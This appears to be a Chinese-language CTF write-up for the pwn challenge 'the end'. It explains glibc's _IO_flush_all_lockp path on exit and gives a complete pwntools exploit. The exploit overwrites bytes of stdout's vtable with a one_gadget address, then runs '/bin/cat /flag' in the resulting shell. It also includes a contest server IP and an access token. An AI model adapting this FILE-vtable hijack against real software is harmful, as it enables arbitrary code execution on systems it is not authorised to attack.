# the end

## 分析

abort、exit函数甚至从main函数return时，会调用`_IO_flush_all_lockp`函数，在该函数内，满足一定条件的情况下，可以解发_IO_jump_table的IO_overflow函数。

条件：

```
fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
```

IO_FILE长这样：

```c
struct _IO_FILE {  
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */  
#define _IO_file_flags _flags  
  /* The following pointers correspond to the C++ streambuf protocol. */  
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  
  char* _IO_read_ptr;   /* Current read pointer */  
  char* _IO_read_end;   /* End of get area. */  
  char* _IO_read_base;  /* Start of putback+get area. */  
  char* _IO_write_base; /* Start of put area. */  
  char* _IO_write_ptr;  /* Current put pointer. */  
  char* _IO_write_end;  /* End of put area. */  
  char* _IO_buf_base;   /* Start of reserve area. */  
  char* _IO_buf_end;    /* End of reserve area. */  
  /* The following fields are used to support backing up and undo. */  
  char *_IO_save_base; /* Pointer to start of non-current get area. */  
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  
  char *_IO_save_end; /* Pointer to end of non-current get area. */  
  struct _IO_marker *_markers;  
  struct _IO_FILE *_chain;  
  int _fileno;//这个就是linux内核中文件描述符fd  
#if 0  
  int _blksize;  
#else  
  int _flags2;  
#endif  
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */  
#define __HAVE_COLUMN /* temporary */  
  /* 1+column number of pbase(); 0 is unknown. */  
  unsigned short _cur_column;  
  signed char _vtable_offset;  
  char _shortbuf[1];  
  /*  char* _save_gptr;  char* _save_egptr; */  
  _IO_lock_t *_lock;  
#ifdef _IO_USE_OLD_IO_FILE  
};  
struct _IO_FILE_plus  
{  
  _IO_FILE file;  
  const struct _IO_jump_t *vtable;//IO函数跳转表  
};  
```

_IO_jump_table　长这样：

```c
const struct _IO_jump_t _IO_file_jumps =  
{  
  JUMP_INIT_DUMMY,  
  JUMP_INIT(finish, INTUSE(_IO_file_finish)),  
  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),  
  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),  
  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),  
  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),  
  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),
  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),  
  JUMP_INIT(seekoff, _IO_new_file_seekoff),  
  JUMP_INIT(seekpos, _IO_default_seekpos),  
  JUMP_INIT(setbuf, _IO_new_file_setbuf), 
  JUMP_INIT(sync, _IO_new_file_sync),  
  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),  
  JUMP_INIT(read, INTUSE(_IO_file_read)),  
  JUMP_INIT(write, _IO_new_file_write),  
  JUMP_INIT(seek, INTUSE(_IO_file_seek)),  
  JUMP_INIT(close, INTUSE(_IO_file_close)),  
  JUMP_INIT(stat, INTUSE(_IO_file_stat)),  
  JUMP_INIT(showmanyc, _IO_default_showmanyc),  
  JUMP_INIT(imbue, _IO_default_imbue)  
}; 
```

因为只有5次的修改机会，所以这里把jump table最后一位的0x1e给忽略了，找了一块同样最后一位为0x1e的内存，只改写了倒数第2个字节，`0x3c53e0`，这个地址需要实际在内存中找一下（主要解决的问题是IO_jump_table的JUMP_INIT_DUMMY最好为0或者1，不能太大，具体原因未分析）。

## 脚本

```python
#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools
import time
import os

IP = "150.109.44.250"
PORT = 20002

one_gg = 0xf02a4

context.arch = "amd64"
context.log_level = 'DEBUG'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
BIN = "./the_end"

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    io = remote(IP, PORT)  
    rud("Input your token:")
    sel("7024ZEBXOyaCi7hWLskq2GKI1NUczUay")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif args.local:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN,  env=env)
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), BIN))]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

rud("here is a gift")
sleep_addr = int(rud(",").strip(","), 16)
libc.address = sleep_addr - libc.symbols["sleep"]
lg("libc address", libc.address)
lg("one_gadget", libc.address+one_gg)

target1_got = 0x3c53e0 + libc.address
target2 = libc.address + one_gg
addr1 = libc.symbols["_IO_2_1_stdout_"] + 0xd8

# pad1 = p64(addr1) + p8(target1_got & 0xff)
pad2 = p64(addr1 +1) + p8((target1_got >> 8) & 0xff)
pad3 = p64(libc.address + 0x3c53e0 + 0x18) + p8(target2 & 0xff)
pad4 = p64(libc.address + 0x3c53e0 + 0x18 + 1) + p8((target2 >> 8) & 0xff)
pad5 = p64(libc.address + 0x3c53e0 + 0x18 + 2) + p8((target2 >> 16) & 0xff)
pad6 = p64(libc.symbols["_IO_2_1_stdout_"] + 0x28) + \
    p8(0x20)  
# io.send(pad1)
io.send(pad2)
io.send(pad3)
io.send(pad4)


# gdb.attach(io, '''
# b *0x{:x}
# c
# b *0x{:x}
# b *0x{:x}
# b *exit
# b *_IO_new_file_finish
# b *_IO_new_file_overflow
# b *__GI__IO_file_close
# b *_IO_flush_all_lockp
# b *(0x00007ffff7a0d000 + 0x000000000007C16D)
# p/x &__free_hook
# p/x &_IO_2_1_stdout_
# p/x 0x00007ffff7a0d000 + 0x{:x}
# '''.format(
#     0x0000555555554000 + 0x000000000000093A,  # read1
#     0x0000555555554000 + 0x0000000000000950,  # read2
#     # 0x555555554000 + 0x0000000000000740,  # stdout
#     # 0x555555554000 + 0x0000000000000921,  # printf
#     # 0x555555554000 + 0x00000000000007AE,  # stdout compare
#     0x00007ffff7a0d000 + one_gg,
#     one_gg,
# )
# )
io.send(pad5)
io.send(pad6)

io.sendline("/bin/cat /flag>&0")
io.interactive()
```
